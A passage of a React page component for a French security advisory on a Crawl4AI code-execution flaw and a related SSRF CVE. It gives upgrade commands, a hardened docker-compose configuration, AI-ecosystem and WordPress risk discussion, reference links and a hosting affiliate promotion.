            <Card className="mb-6 bg-muted/50">
              <CardHeader>
                <CardTitle className="text-lg font-mono">Commandes de mise à jour</CardTitle>
              </CardHeader>
              <CardContent>
                <pre className="text-sm overflow-x-auto">
{`# Pour pip
pip install --upgrade crawl4ai>=0.8.0

# Pour Docker
docker pull unclecode/crawl4ai:latest
# ou
docker pull unclecode/crawl4ai:0.8.0

# Vérification de la version
pip show crawl4ai | grep Version`}
                </pre>
              </CardContent>
            </Card>
            
            <h3 id="hardening-docker" className="text-2xl font-bold mb-4 mt-8">Hardening Docker</h3>
            
            <p className="mb-4">
              Au-delà de la mise à jour, des mesures de durcissement Docker sont essentielles pour limiter 
              l'impact d'éventuelles vulnérabilités futures :
            </p>
            
            <Card className="mb-6 bg-muted/50">
              <CardHeader>
                <CardTitle className="text-lg font-mono">docker-compose.yml sécurisé</CardTitle>
              </CardHeader>
              <CardContent>
                <pre className="text-sm overflow-x-auto">
{`version: '3.8'
services:
  crawl4ai:
    image: unclecode/crawl4ai:0.8.0
    user: "1000:1000"  # Exécution non-root
    environment:
      - CRAWL4AI_HOOKS_ENABLED=false  # Hooks désactivés
    networks:
      - isolated  # Réseau isolé
    read_only: true  # Système de fichiers en lecture seule
    tmpfs:
      - /tmp  # Montage tmpfs pour les fichiers temporaires
    security_opt:
      - no-new-privileges:true  # Empêche l'escalade de privilèges
    # NE PAS MONTER le socket Docker
    # volumes:
    #   - /var/run/docker.sock:/var/run/docker.sock  # DANGEREUX

networks:
  isolated:
    driver: bridge
    internal: true  # Pas d'accès Internet direct`}
                </pre>
              </CardContent>
            </Card>
            
            <h3 id="detection" className="text-2xl font-bold mb-4 mt-8">Détection et Monitoring</h3>
            
            <p className="mb-4">
              Pour détecter les tentatives d'exploitation ou les compromissions passées, surveillez les 
              indicateurs suivants :
            </p>
            
            <div className="space-y-2 mb-6">
              {iocIndicators.slice(0, 8).map((ioc, index) => (
                <div key={index} className="flex items-start gap-2 p-2 bg-muted/30 rounded">
                  <Badge variant="outline" className="text-xs shrink-0">
                    {ioc.type}
                  </Badge>
                  <code className="text-sm text-red-400">{ioc.indicator}</code>
                  <span className="text-sm text-muted-foreground">- {ioc.description}</span>
                </div>
              ))}
            </div>
          </section>

          <section id="ssrf-vulnerabilite" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Network className="w-8 h-8 text-orange-500" />
              Vulnérabilité SSRF Connexe (CVE-2025-28197)
            </h2>
            
            <p className="mb-4">
              Il est important de noter que Crawl4AI a également été affecté par une vulnérabilité SSRF 
              (Server-Side Request Forgery) répertoriée sous <strong>CVE-2025-28197</strong> avec un score 
              CVSS de 9.1 (High). Cette vulnérabilité, présente dans les versions ≤ 0.4.247, permet à un 
              attaquant de faire effectuer des requêtes HTTP arbitraires depuis le serveur vers des cibles 
              internes ou externes.
            </p>
            
            <p className="mb-4">
              La combinaison de ces deux vulnérabilités (RCE + SSRF) représente une menace particulièrement 
              grave pour les déploiements qui n'ont pas été mis à jour régulièrement.
            </p>
            
            <Card className="bg-orange-950/20 border-orange-500/50">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-orange-400">
                  <AlertTriangle className="w-5 h-5" />
                  Double Exposition
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p>
                  Les instances Crawl4AI antérieures à 0.4.247 sont vulnérables à la fois à la SSRF et à la RCE 
                  (si elles n'ont jamais été mises à jour). Une mise à jour vers 0.8.0+ corrige les deux problèmes.
                </p>
              </CardContent>
            </Card>
          </section>

          <section id="implications-ia" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Laptop className="w-8 h-8 text-purple-500" />
              Implications pour l'Écosystème IA/LLM
            </h2>
            
            <p className="mb-4">
              Cette vulnérabilité soulève des questions importantes sur la sécurité des outils de 
              l'écosystème IA/LLM, qui évoluent rapidement et sont souvent déployés sans considérations 
              de sécurité adéquates. Crawl4AI n'est qu'un exemple parmi de nombreux outils similaires 
              présentant des risques comparables.
            </p>
            
            <h3 className="text-xl font-bold mb-4">Risques Systémiques</h3>
            
            <ul className="list-disc pl-6 mb-4 space-y-2">
              <li>
                <strong>Chaîne d'approvisionnement IA</strong> : Les outils de scraping alimentent souvent 
                les pipelines d'entraînement de modèles. Une compromission peut injecter des données 
                malveillantes dans les datasets.
              </li>
              <li>
                <strong>Exposition des clés API LLM</strong> : Les instances Crawl4AI contiennent 
                fréquemment des clés d'accès à des services comme OpenAI, représentant une valeur 
                financière directe pour les attaquants.
              </li>
              <li>
                <strong>Déploiements précipités</strong> : La course à l'intégration de l'IA pousse à 
                des déploiements rapides sans audit de sécurité adéquat.
              </li>
              <li>
                <strong>Manque de segmentation</strong> : Les outils d'IA sont souvent déployés avec des 
                accès réseau étendus pour leur permettre de récupérer des données de diverses sources.
              </li>
            </ul>
          </section>

          <section id="wordpress-impact" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Globe className="w-8 h-8 text-blue-500" />
              Impact pour les Sites WordPress
            </h2>
            
            <p className="mb-4">
              Bien que Crawl4AI ne soit pas un outil WordPress natif, de nombreux propriétaires de sites 
              WordPress utilisent des outils de scraping comme Crawl4AI pour :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li>Migrer du contenu depuis d'anciens sites</li>
              <li>Agréger du contenu pour des portails d'actualités</li>
              <li>Surveiller les sites concurrents</li>
              <li>Alimenter des chatbots IA avec des données de leur site</li>
              <li>Créer des bases de connaissances RAG</li>
            </ul>
            
            <p className="mb-4">
              Si une instance Crawl4AI utilisée dans le contexte d'un projet WordPress est compromise, 
              l'attaquant peut potentiellement :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li>Accéder aux credentials WordPress stockées dans l'environnement</li>
              <li>Pivoter vers le serveur WordPress si sur le même réseau</li>
              <li>Voler les clés API utilisées pour l'intégration IA</li>
              <li>Injecter du contenu malveillant dans les pipelines de données</li>
            </ul>
            
            <Card className="bg-blue-950/20 border-blue-500/50">
              <CardContent className="pt-6">
                <h3 className="font-bold text-blue-400 mb-2">Recommandation pour les Agences WordPress</h3>
                <p>
                  Auditez immédiatement tous les outils de scraping et d'extraction de données utilisés dans 
                  vos projets clients. Assurez-vous qu'ils sont isolés du réseau contenant vos sites WordPress 
                  de production et que les credentials ne sont pas partagés.
                </p>
              </CardContent>
            </Card>
          </section>

          <section id="comparaison-vulnerabilites" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Scale className="w-8 h-8 text-yellow-500" />
              Comparaison avec Vulnérabilités Similaires
            </h2>
            
            <p className="mb-4">
              Cette vulnérabilité s'inscrit dans une tendance préoccupante de failles de sécurité dans les 
              outils d'automatisation et d'IA. Voici une comparaison avec des vulnérabilités récentes similaires :
            </p>
            
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b">
                    <th className="text-left p-2">CVE/ID</th>
                    <th className="text-left p-2">Produit</th>
                    <th className="text-left p-2">Type</th>
                    <th className="text-left p-2">CVSS</th>
                    <th className="text-left p-2">Date</th>
                  </tr>
                </thead>
                <tbody>
                  {comparableVulnerabilities.map((vuln, index) => (
                    <tr key={index} className="border-b">
                      <td className="p-2 font-mono">{vuln.cve}</td>
                      <td className="p-2">{vuln.product}</td>
                      <td className="p-2">{vuln.type}</td>
                      <td className="p-2">
                        <Badge variant={parseFloat(vuln.cvss) >= 9 ? "destructive" : "secondary"}>
                          {vuln.cvss}
                        </Badge>
                      </td>
                      <td className="p-2">{vuln.date}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            
            <p className="mt-4 text-muted-foreground">
              Le pattern commun à ces vulnérabilités est l'utilisation de sandboxes Python mal implémentés 
              ou de fonctions d'exécution dynamique de code sans validation adéquate.
            </p>
          </section>

          <section id="faq" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <BookOpen className="w-8 h-8 text-purple-500" />
              FAQ Sécurité
            </h2>
            
            <Accordion type="single" collapsible className="w-full">
              {faqData.map((faq, index) => (
                <AccordionItem key={index} value={`item-${index}`}>
                  <AccordionTrigger className="text-left">
                    {faq.question}
                  </AccordionTrigger>
                  <AccordionContent className="text-muted-foreground">
                    {faq.answer}
                  </AccordionContent>
                </AccordionItem>
              ))}
            </Accordion>
          </section>

          <section id="references" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <ExternalLink className="w-8 h-8 text-blue-500" />
              Références et Sources Techniques
            </h2>
            
            <div className="space-y-2">
              <a href="https://github.com/advisories/GHSA-5882-5rx9-xgxp" target="_blank" rel="noopener noreferrer" 
                 className="flex items-center gap-2 p-3 bg-muted/30 rounded hover:bg-muted/50 transition-colors">
                <ExternalLink className="w-4 h-4 text-primary" />
                <span>GitHub Advisory GHSA-5882-5rx9-xgxp</span>
              </a>
              <a href="https://github.com/unclecode/crawl4ai/blob/release/v0.8.0/docs/blog/release-v0.8.0.md" target="_blank" rel="noopener noreferrer"
                 className="flex items-center gap-2 p-3 bg-muted/30 rounded hover:bg-muted/50 transition-colors">
                <ExternalLink className="w-4 h-4 text-primary" />
                <span>Crawl4AI v0.8.0 Release Notes</span>
              </a>
              <a href="https://github.com/unclecode/crawl4ai/blob/release/v0.8.0/docs/migration/v0.8.0-upgrade-guide.md" target="_blank" rel="noopener noreferrer"
                 className="flex items-center gap-2 p-3 bg-muted/30 rounded hover:bg-muted/50 transition-colors">
                <ExternalLink className="w-4 h-4 text-primary" />
                <span>Crawl4AI v0.8.0 Upgrade Guide</span>
              </a>
              <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-28197" target="_blank" rel="noopener noreferrer"
                 className="flex items-center gap-2 p-3 bg-muted/30 rounded hover:bg-muted/50 transition-colors">
                <ExternalLink className="w-4 h-4 text-primary" />
                <span>NVD - CVE-2025-28197 (SSRF)</span>
              </a>
              <a href="https://projectdiscovery.io" target="_blank" rel="noopener noreferrer"
                 className="flex items-center gap-2 p-3 bg-muted/30 rounded hover:bg-muted/50 transition-colors">
                <ExternalLink className="w-4 h-4 text-primary" />
                <span>ProjectDiscovery - Découvreur de la vulnérabilité</span>
              </a>
              <a href="https://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener noreferrer"
                 className="flex items-center gap-2 p-3 bg-muted/30 rounded hover:bg-muted/50 transition-colors">
                <ExternalLink className="w-4 h-4 text-primary" />
                <span>CWE-94: Improper Control of Generation of Code</span>
              </a>
            </div>
          </section>

          <Card className="bg-primary/10 border-primary/50 mb-8">
            <CardContent className="pt-6">
              <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-primary" />
                Protégez Votre Infrastructure avec Kinsta
              </h3>
              <p className="mb-4">
                Pour vos sites WordPress de production, choisissez un hébergeur qui prend la sécurité au sérieux. 
                Kinsta offre une isolation complète des conteneurs, des pare-feu au niveau de l'infrastructure, 
                et des mises à jour de sécurité automatiques.
              </p>
              <div className="flex flex-wrap gap-4">
                <Link href="https://kinsta.com/fr/?kaid=CYISLEFCEOAL" target="_blank">
                  <Button data-testid="button-kinsta-cta">
                    Découvrir Kinsta
                    <ArrowRight className="w-4 h-4 ml-2" />
                  </Button>
                </Link>
                <Link href="/audit-site">
                  <Button variant="outline" data-testid="button-audit-cta">
                    Auditer Mon Site
                  </Button>
                </Link>
              </div>
            </CardContent>
          </Card>

          <footer className="border-t pt-8 mt-12">
            <div className="flex flex-wrap gap-4 justify-between items-center">
              <div className="text-sm text-muted-foreground">
                <p>Dernière mise à jour : 19 janvier 2026</p>
                <p>© 2026 WP Vitesse Pro Security Lab</p>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" data-testid="button-share">
                  <Share2 className="w-4 h-4 mr-2" />
                  Partager
                </Button>
              </div>
            </div>
          </footer>
        </article>
      </main>
    </div>
  );
}
